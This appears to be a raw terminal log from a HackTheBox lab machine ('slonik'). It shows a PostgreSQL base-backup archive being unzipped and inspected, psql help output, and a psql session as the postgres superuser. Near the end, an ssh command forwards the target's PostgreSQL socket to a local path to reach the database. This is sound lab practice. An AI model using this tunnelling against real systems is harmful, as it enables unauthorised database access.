drwx------  3 root    root         60 Oct 19 22:44 systemd-private-e2da5422cd214843a4731f99880f4d01-colord.service-XUDjqo
drwx------  3 root    root         60 Oct 19 22:43 systemd-private-e2da5422cd214843a4731f99880f4d01-haveged.service-A6llxa
drwx------  3 root    root         60 Oct 19 22:43 systemd-private-e2da5422cd214843a4731f99880f4d01-ModemManager.service-4eDKe0                                                                                                                             
drwx------  3 root    root         60 Oct 19 22:55 systemd-private-e2da5422cd214843a4731f99880f4d01-pcscd.service-HIxVIo
drwx------  3 root    root         60 Oct 19 22:43 systemd-private-e2da5422cd214843a4731f99880f4d01-polkit.service-IsmMM1
drwx------  3 root    root         60 Oct 19 22:43 systemd-private-e2da5422cd214843a4731f99880f4d01-rsyslog.service-oS3kvB
drwx------  3 root    root         60 Oct 19 22:43 systemd-private-e2da5422cd214843a4731f99880f4d01-systemd-logind.service-rLslCA                                                                                                                           
drwx------  3 root    root         60 Oct 19 22:43 systemd-private-e2da5422cd214843a4731f99880f4d01-upower.service-vEKN60
drwxrwxrwt  2 root    root         40 Oct 19 22:43 VMwareDnD
drwx------  2 root    root         40 Oct 19 22:43 vmware-root_675-3980232795
-r--r--r--  1 root    root         11 Oct 19 22:43 .X0-lock
drwxrwxrwt  2 root    root         60 Oct 19 22:43 .X11-unix
-rw-------  1 fixit42 fixit42     398 Oct 19 22:43 .xfsm-ICE-23B2E3
drwxrwxrwt  2 root    root         40 Oct 19 22:43 .XIM-unix
                                                                                                                              
┌──(fixit42㉿kali)-[/tmp]
└─$ mv archive-2025-10-19T2153.zip ~/boxes/htb/slonik 
mv: cannot remove 'archive-2025-10-19T2153.zip': Operation not permitted
                                                                                                                              
┌──(fixit42㉿kali)-[/tmp]
└─$ cp archive-2025-10-19T2153.zip ~/boxes/htb/slonik 
                                                                                                                              
┌──(fixit42㉿kali)-[/tmp]
└─$ cd ~/boxes/htb/slonik
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ ls -la
total 4572
drwxrwxr-x  3 fixit42 fixit42    4096 Oct 19 23:56 .
drwxr-xr-x 15 fixit42 fixit42    4096 Oct 19 23:16 ..
-rw-r--r--  1 fixit42 fixit42 4666449 Oct 19 23:57 archive-2025-10-19T2153.zip
drwxr-xr-x 19 root    root       4096 Sep 22 13:04 mount
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ unzip archive-2025-10-19T2153.zip 
Archive:  archive-2025-10-19T2153.zip
   creating: opt/backups/current/
   creating: opt/backups/current/pg_twophase/
   creating: opt/backups/current/pg_wal/
  inflating: opt/backups/current/pg_wal/00000001000000020000002C  
   creating: opt/backups/current/pg_wal/archive_status/
   creating: opt/backups/current/pg_stat/
   creating: opt/backups/current/pg_replslot/
   creating: opt/backups/current/pg_dynshmem/
   creating: opt/backups/current/pg_snapshots/
   creating: opt/backups/current/pg_logical/
 extracting: opt/backups/current/pg_logical/replorigin_checkpoint  
   creating: opt/backups/current/pg_logical/snapshots/
   creating: opt/backups/current/pg_logical/mappings/
 extracting: opt/backups/current/PG_VERSION  
   creating: opt/backups/current/pg_xact/
  inflating: opt/backups/current/pg_xact/0000  
  inflating: opt/backups/current/postgresql.auto.conf  
   creating: opt/backups/current/pg_tblspc/
  inflating: opt/backups/current/backup_label  
   creating: opt/backups/current/base/
   creating: opt/backups/current/base/13761/
  inflating: opt/backups/current/base/13761/2702  
  inflating: opt/backups/current/base/13761/6111  

```

...

```
                                                                                                                             
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ file /tmp/.s.PGSQL.5432
/tmp/.s.PGSQL.5432: socket
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ psql -U postgres
psql: error: connection to server on socket "/var/run/postgresql/.s.PGSQL.5432" failed: No such file or directory
        Is the server running locally and accepting connections on that socket?
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ psql -h         
/usr/lib/postgresql/17/bin/psql: option requires an argument -- 'h'
psql: hint: Try "psql --help" for more information.
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ psql --help
psql is the PostgreSQL interactive terminal.

Usage:
  psql [OPTION]... [DBNAME [USERNAME]]

General options:
  -c, --command=COMMAND    run only single command (SQL or internal) and exit
  -d, --dbname=DBNAME      database name to connect to
  -f, --file=FILENAME      execute commands from file, then exit
  -l, --list               list available databases, then exit
  -v, --set=, --variable=NAME=VALUE
                           set psql variable NAME to VALUE
                           (e.g., -v ON_ERROR_STOP=1)
  -V, --version            output version information, then exit
  -X, --no-psqlrc          do not read startup file (~/.psqlrc)
  -1 ("one"), --single-transaction
                           execute as a single transaction (if non-interactive)
  -?, --help[=options]     show this help, then exit
      --help=commands      list backslash commands, then exit
      --help=variables     list special variables, then exit

Input and output options:
  -a, --echo-all           echo all input from script
  -b, --echo-errors        echo failed commands
  -e, --echo-queries       echo commands sent to server
  -E, --echo-hidden        display queries that internal commands generate
  -L, --log-file=FILENAME  send session log to file
  -n, --no-readline        disable enhanced command line editing (readline)
  -o, --output=FILENAME    send query results to file (or |pipe)
  -q, --quiet              run quietly (no messages, only query output)
  -s, --single-step        single-step mode (confirm each query)
  -S, --single-line        single-line mode (end of line terminates SQL command)

Output format options:
  -A, --no-align           unaligned table output mode
      --csv                CSV (Comma-Separated Values) table output mode
  -F, --field-separator=STRING
                           field separator for unaligned output (default: "|")
  -H, --html               HTML table output mode
  -P, --pset=VAR[=ARG]     set printing option VAR to ARG (see \pset command)
  -R, --record-separator=STRING
                           record separator for unaligned output (default: newline)
  -t, --tuples-only        print rows only
  -T, --table-attr=TEXT    set HTML table tag attributes (e.g., width, border)
  -x, --expanded           turn on expanded table output
  -z, --field-separator-zero
                           set field separator for unaligned output to zero byte
  -0, --record-separator-zero
                           set record separator for unaligned output to zero byte

Connection options:
  -h, --host=HOSTNAME      database server host or socket directory
  -p, --port=PORT          database server port
  -U, --username=USERNAME  database user name
  -w, --no-password        never prompt for password
  -W, --password           force password prompt (should happen automatically)

For more information, type "\?" (for internal commands) or "\help" (for SQL
commands) from within psql, or consult the psql section in the PostgreSQL
documentation.

Report bugs to <pgsql-bugs@lists.postgresql.org>.
PostgreSQL home page: <https://www.postgresql.org/>
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ psql --help |grep socket
  -h, --host=HOSTNAME      database server host or socket directory
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ psql -h /tmp/.s.PGSQL.5432
psql: error: connection to server on socket "/tmp/.s.PGSQL.5432/.s.PGSQL.5432" failed: Not a directory
        Is the server running locally and accepting connections on that socket?
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ psql -h /tmp/             
psql: error: connection to server on socket "/tmp//.s.PGSQL.5432" failed: FATAL:  Peer authentication failed for user "fixit42"
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ psql -h /tmp/ -U postgres
psql (17.6 (Debian 17.6-1), server 14.19 (Ubuntu 14.19-0ubuntu0.22.04.1))
Type "help" for help.

postgres=# 

```

other window


```
  inflating: opt/backups/current/base/13760/3085  
 extracting: opt/backups/current/base/13760/13582  
  inflating: opt/backups/current/base/13760/2704  
  inflating: opt/backups/current/base/13760/2659  
  inflating: opt/backups/current/base/13760/3456_fsm  
  inflating: opt/backups/current/base/13760/2606_fsm  
 extracting: opt/backups/current/base/13760/2328  
  inflating: opt/backups/current/base/13760/2833  
 extracting: opt/backups/current/base/13760/6102  
 extracting: opt/backups/current/base/13760/2336  
  inflating: opt/backups/current/base/13760/2753_vm  
  inflating: opt/backups/current/base/13760/2680  
  inflating: opt/backups/current/base/13760/3575  
  inflating: opt/backups/current/base/13760/2688  
  inflating: opt/backups/current/base/13760/3767  
  inflating: opt/backups/current/base/13760/2619_vm  
  inflating: opt/backups/current/base/13760/2610_fsm  
  inflating: opt/backups/current/base/13760/2841  
  inflating: opt/backups/current/base/13760/175  
 extracting: opt/backups/current/base/13760/4167  
  inflating: opt/backups/current/base/13760/2681  
  inflating: opt/backups/current/base/13760/2674  
  inflating: opt/backups/current/base/13760/2612_fsm  
  inflating: opt/backups/current/base/13760/1249_fsm  
  inflating: opt/backups/current/base/13760/3609  
  inflating: opt/backups/current/base/13760/3534  
  inflating: opt/backups/current/base/13760/3503  
  inflating: opt/backups/current/base/13760/2840_fsm  
  inflating: opt/backups/current/base/13760/pg_filenode.map  
  inflating: opt/backups/current/base/13760/13594_vm  
  inflating: opt/backups/current/base/13760/2609  
  inflating: opt/backups/current/base/13760/6113  
 extracting: opt/backups/current/base/13760/3350  
  inflating: opt/backups/current/base/13760/2612  
  inflating: opt/backups/current/base/13760/2665  
  inflating: opt/backups/current/base/13760/2602  
  inflating: opt/backups/current/base/13760/2683  
  inflating: opt/backups/current/base/13760/13593  
 extracting: opt/backups/current/base/13760/6104  
  inflating: opt/backups/current/base/13760/13589_vm  
  inflating: opt/backups/current/base/13760/828  
  inflating: opt/backups/current/base/13760/2612_vm  
  inflating: opt/backups/current/base/13760/2668  
 extracting: opt/backups/current/base/13760/4145  
  inflating: opt/backups/current/base/13760/3257  
  inflating: opt/backups/current/base/13760/2617_vm  
  inflating: opt/backups/current/base/13760/3431  
  inflating: opt/backups/current/base/13760/2605_vm  
  inflating: opt/backups/current/base/13760/2657  
 extracting: opt/backups/current/base/13760/4163  
  inflating: opt/backups/current/base/13760/2663  
 extracting: opt/backups/current/base/13760/2830  
  inflating: opt/backups/current/base/13760/1259_vm  
  inflating: opt/backups/current/base/13760/2579  
 extracting: opt/backups/current/base/13760/2611  
  inflating: opt/backups/current/base/13760/2187  
  inflating: opt/backups/current/base/13760/3603_vm  
 extracting: opt/backups/current/base/13760/3596  
  inflating: opt/backups/current/base/13760/3433  
  inflating: opt/backups/current/base/13760/2693  
 extracting: opt/backups/current/base/13760/4159  
  inflating: opt/backups/current/base/13760/13589_fsm  
  inflating: opt/backups/current/base/13760/1249_vm  
  inflating: opt/backups/current/base/13760/2619_fsm  
  inflating: opt/backups/current/base/13760/5002  
  inflating: opt/backups/current/base/13760/2616_fsm  
  inflating: opt/backups/current/base/13760/3541_vm  
  inflating: opt/backups/current/base/13760/2602_vm  
  inflating: opt/backups/current/base/13760/2667  
  inflating: opt/backups/current/base/13760/2840  
  inflating: opt/backups/current/base/13760/13594_fsm  
  inflating: opt/backups/current/base/13760/13584  
  inflating: opt/backups/current/base/13760/2653  
  inflating: opt/backups/current/base/13760/3764_vm  
  inflating: opt/backups/current/base/13760/2673_fsm  
  inflating: opt/backups/current/base/13760/2699  
  inflating: opt/backups/current/base/13760/1255_fsm  
  inflating: opt/backups/current/base/13760/2606_vm  
  inflating: opt/backups/current/base/13760/13579_fsm  
 extracting: opt/backups/current/base/13760/3256  
 extracting: opt/backups/current/base/13760/4165  
  inflating: opt/backups/current/base/13760/2836_vm  
  inflating: opt/backups/current/base/13760/2228  
  inflating: opt/backups/current/base/13760/2703  
  inflating: opt/backups/current/base/13760/2600_vm  
  inflating: opt/backups/current/base/13760/2605_fsm  
  inflating: opt/backups/current/base/13760/174  
  inflating: opt/backups/current/base/13760/3607  
  inflating: opt/backups/current/base/13760/2601  
  inflating: opt/backups/current/base/13760/3394_fsm  
  inflating: opt/backups/current/base/13760/3606  
 extracting: opt/backups/current/base/13760/4143  
  inflating: opt/backups/current/base/13760/2609_vm  
  inflating: opt/backups/current/base/13760/4160  
  inflating: opt/backups/current/base/13760/548  
  inflating: opt/backups/current/base/13760/2601_vm  
  inflating: opt/backups/current/base/13760/2673  
  inflating: opt/backups/current/base/13760/3764  
  inflating: opt/backups/current/base/13760/3456  
  inflating: opt/backups/current/base/13760/2836  
  inflating: opt/backups/current/base/13760/2701  
  inflating: opt/backups/current/base/13760/2609_fsm  
  inflating: opt/backups/current/base/13760/4150  
  inflating: opt/backups/current/base/13760/2664  
  inflating: opt/backups/current/base/13760/2605  
  inflating: opt/backups/current/base/13760/2650  
  inflating: opt/backups/current/base/13760/3712  
  inflating: opt/backups/current/base/13760/3599  
 extracting: opt/backups/current/base/13760/4171  
  inflating: opt/backups/current/base/13760/4148  
  inflating: opt/backups/current/base/13760/2607_fsm  
  inflating: opt/backups/current/base/13760/3541_fsm  
  inflating: opt/backups/current/base/13760/2666  
  inflating: opt/backups/current/base/13760/2617_fsm  
  inflating: opt/backups/current/base/13760/2684  
  inflating: opt/backups/current/base/13760/3608  
  inflating: opt/backups/current/base/13760/3603  
  inflating: opt/backups/current/base/13760/1249  
  inflating: opt/backups/current/base/13760/2836_fsm  
 extracting: opt/backups/current/base/13760/3430  
  inflating: opt/backups/current/base/13760/13583  
  inflating: opt/backups/current/base/13760/2757  
 extracting: opt/backups/current/base/13760/826  
  inflating: opt/backups/current/base/13760/4146  
  inflating: opt/backups/current/base/13760/2838  
  inflating: opt/backups/current/base/13760/2689  
  inflating: opt/backups/current/base/13760/4154  
  inflating: opt/backups/current/base/13760/2838_fsm  
 extracting: opt/backups/current/base/13760/3466  
  inflating: opt/backups/current/base/13760/6110  
  inflating: opt/backups/current/base/13760/2674_fsm  
 extracting: opt/backups/current/base/13760/4155  
  inflating: opt/backups/current/base/13760/3468  
  inflating: opt/backups/current/base/13760/2617  
  inflating: opt/backups/current/base/13760/2615  
  inflating: opt/backups/current/base/13760/3164  
 extracting: opt/backups/current/base/13760/4157  
  inflating: opt/backups/current/base/13760/2835  
  inflating: opt/backups/current/base/13760/2608_vm  
  inflating: opt/backups/current/base/13760/3600  
  inflating: opt/backups/current/base/13760/2840_vm  
  inflating: opt/backups/current/base/13760/113  
  inflating: opt/backups/current/base/13760/3766  
  inflating: opt/backups/current/base/13760/2610  
  inflating: opt/backups/current/base/13760/3600_vm  
  inflating: opt/backups/current/base/13760/3997  
  inflating: opt/backups/current/base/13760/13579_vm  
   creating: opt/backups/current/pg_subtrans/
   creating: opt/backups/current/pg_serial/
   creating: opt/backups/current/pg_notify/
  inflating: opt/backups/current/backup_manifest  
   creating: opt/backups/current/pg_stat_tmp/
   creating: opt/backups/current/global/
  inflating: opt/backups/current/global/1260  
  inflating: opt/backups/current/global/4186  
 extracting: opt/backups/current/global/2846  
 extracting: opt/backups/current/global/3592  
  inflating: opt/backups/current/global/4178  
  inflating: opt/backups/current/global/2396_vm  
  inflating: opt/backups/current/global/1213  
 extracting: opt/backups/current/global/6100  
  inflating: opt/backups/current/global/1260_fsm  
  inflating: opt/backups/current/global/1260_vm  
  inflating: opt/backups/current/global/1214_vm  
  inflating: opt/backups/current/global/2847  
  inflating: opt/backups/current/global/2695  
  inflating: opt/backups/current/global/6114  
 extracting: opt/backups/current/global/4177  
  inflating: opt/backups/current/global/1262_fsm  
  inflating: opt/backups/current/global/4182  
  inflating: opt/backups/current/global/1213_fsm  
 extracting: opt/backups/current/global/4175  
  inflating: opt/backups/current/global/2396_fsm  
  inflating: opt/backups/current/global/1214  
  inflating: opt/backups/current/global/2965  
  inflating: opt/backups/current/global/1262  
 extracting: opt/backups/current/global/4181  
  inflating: opt/backups/current/global/2694  
  inflating: opt/backups/current/global/4184  
  inflating: opt/backups/current/global/6001  
  inflating: opt/backups/current/global/6115  
 extracting: opt/backups/current/global/2964  
 extracting: opt/backups/current/global/4183  
  inflating: opt/backups/current/global/3593  
 extracting: opt/backups/current/global/2966  
  inflating: opt/backups/current/global/pg_control  
  inflating: opt/backups/current/global/2677  
  inflating: opt/backups/current/global/4176  
  inflating: opt/backups/current/global/2397  
  inflating: opt/backups/current/global/2671  
  inflating: opt/backups/current/global/1213_vm  
  inflating: opt/backups/current/global/pg_filenode.map  
  inflating: opt/backups/current/global/1261_vm  
  inflating: opt/backups/current/global/1261  
 extracting: opt/backups/current/global/6000  
  inflating: opt/backups/current/global/2396  
  inflating: opt/backups/current/global/1232  
  inflating: opt/backups/current/global/1233  
  inflating: opt/backups/current/global/1262_vm  
  inflating: opt/backups/current/global/4061  
 extracting: opt/backups/current/global/4185  
  inflating: opt/backups/current/global/2676  
  inflating: opt/backups/current/global/2697  
  inflating: opt/backups/current/global/1214_fsm  
 extracting: opt/backups/current/global/4060  
  inflating: opt/backups/current/global/6002  
  inflating: opt/backups/current/global/2672  
  inflating: opt/backups/current/global/1261_fsm  
  inflating: opt/backups/current/global/2698  
  inflating: opt/backups/current/global/2967  
   creating: opt/backups/current/pg_commit_ts/
   creating: opt/backups/current/pg_multixact/
   creating: opt/backups/current/pg_multixact/offsets/
  inflating: opt/backups/current/pg_multixact/offsets/0000  
   creating: opt/backups/current/pg_multixact/members/
  inflating: opt/backups/current/pg_multixact/members/0000  
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ ls -la
total 4576
drwxrwxr-x  4 fixit42 fixit42    4096 Oct 19 23:57 .
drwxr-xr-x 15 fixit42 fixit42    4096 Oct 19 23:16 ..
-rw-r--r--  1 fixit42 fixit42 4666449 Oct 19 23:57 archive-2025-10-19T2153.zip
drwxr-xr-x 19 root    root       4096 Sep 22 13:04 mount
drwxrwxr-x  3 fixit42 fixit42    4096 Oct 19 23:57 opt
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ cd opt               
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik/opt]
└─$ ls -la
total 12
drwxrwxr-x 3 fixit42 fixit42 4096 Oct 19 23:57 .
drwxrwxr-x 4 fixit42 fixit42 4096 Oct 19 23:57 ..
drwxrwxr-x 3 fixit42 fixit42 4096 Oct 19 23:57 backups
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik/opt]
└─$ cd backups
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/opt/backups]
└─$ ls -la
total 12
drwxrwxr-x  3 fixit42 fixit42 4096 Oct 19 23:57 .
drwxrwxr-x  3 fixit42 fixit42 4096 Oct 19 23:57 ..
drwxr-xr-x 19 fixit42 fixit42 4096 Oct 19 23:53 current
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/opt/backups]
└─$ cd current  
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/opt/backups/current]
└─$ ls -la
total 268
drwxr-xr-x 19 fixit42 fixit42   4096 Oct 19 23:53 .
drwxrwxr-x  3 fixit42 fixit42   4096 Oct 19 23:57 ..
-rw-------  1 fixit42 fixit42    227 Oct 19 23:53 backup_label
-rw-------  1 fixit42 fixit42 180576 Oct 19 23:53 backup_manifest
drwx------  6 fixit42 fixit42   4096 Oct 19 23:53 base
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 global
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_commit_ts
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_dynshmem
drwx------  4 fixit42 fixit42   4096 Oct 19 23:53 pg_logical
drwx------  4 fixit42 fixit42   4096 Oct 19 23:53 pg_multixact
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_notify
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_replslot
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_serial
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_snapshots
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_stat
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_stat_tmp
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_subtrans
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_tblspc
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_twophase
-rw-------  1 fixit42 fixit42      3 Oct 19 23:53 PG_VERSION
drwx------  3 fixit42 fixit42   4096 Oct 19 23:53 pg_wal
drwx------  2 fixit42 fixit42   4096 Oct 19 23:53 pg_xact
-rw-------  1 fixit42 fixit42     88 Oct 19 23:53 postgresql.auto.conf
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/opt/backups/current]
└─$ cat PG_VERSION 
14
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/opt/backups/current]
└─$ cat postgresql.auto.conf 
# Do not edit this file manually!
# It will be overwritten by the ALTER SYSTEM command.
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/opt/backups/current]
└─$ cat backup_label 
START WAL LOCATION: 2/2C000028 (file 00000001000000020000002C)
CHECKPOINT LOCATION: 2/2C000060
BACKUP METHOD: streamed
BACKUP FROM: primary
START TIME: 2025-10-19 21:53:01 UTC
LABEL: pg_basebackup base backup
START TIMELINE: 1
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/opt/backups/current]
└─$ cat backup_manifest 
{ "PostgreSQL-Backup-Manifest-Version": 1,
"Files": [
{ "Path": "backup_label", "Size": 227, "Last-Modified": "2025-10-19 21:53:01 GMT", "Checksum-Algorithm": "CRC32C", "Checksum": "48ea0821" },
{ "Path": "pg_logical/replorigin_checkpoint", "Size": 8, "Last-Modified": "2025-10-19 21:53:01 GMT", "Checksum-Algorithm": "CRC32C", "Checksum": "c74b6748" },
{ "Path": "PG_VERSION", "Size": 3, "Last-Modified": "2023-10-23 14:08:07 GMT", "Checksum-Algorithm": "CRC32C", "Checksum": "fdece531" },
{ "Path": "pg_xact/0000", "Size": 8192, "Last-Modified": "2025-10-19 20:05:02 GMT", "Checksum-Algorithm": "CRC32C", "Checksum": "84330d65" },
{ "Path": "postgresql.auto.conf", "Size": 88, "Last-Modified": "2023-10-23 14:08:07 GMT", "Checksum-Algorithm": "CRC32C", "Checksum": "536f950b" },
{ "Path": "base/13761/2702", "Size": 8192, "Last-Modified": "2023-10-23 14:08:07 GMT", "Checksum-Algorithm": "CRC32C", "Checksum": "c4ce6b25" },
{ "Path": "base/13761/6111", "Size": 8192, "Last-Modified": "2023-10-23 14:08:07 GMT", "Checksum-Algorithm": "CRC32C", "Checksum": "e6d4d5bd" },
{ "Path": "base/13761/6176", "Size": 8192, "Last-Modified": "2023-10-23 14:08:07 GMT", "Checksum-Algorithm": "CRC32C", "Checksum": "e9a328e7" },

```
...
```
", "Checksum": "23464490" },
{ "Path": "global/pg_control", "Size": 8192, "Last-Modified": "2025-10-19 21:53:01 GMT", "Checksum-Algorithm": "CRC32C", "Checksum": "43872087" }
],
"WAL-Ranges": [
{ "Timeline": 1, "Start-LSN": "2/2C000028", "End-LSN": "2/2C000100" }
],
"Manifest-Checksum": "0dbda14e4cbc5e76ab20ae0b9b895cf4f553464c54c62a4da7f4a2b2f83dded0"}
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/opt/backups/current]
└─$ ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&             @@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@   ############.    ############   ##########*  &@@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
(service@10.129.234.160) Password: 
```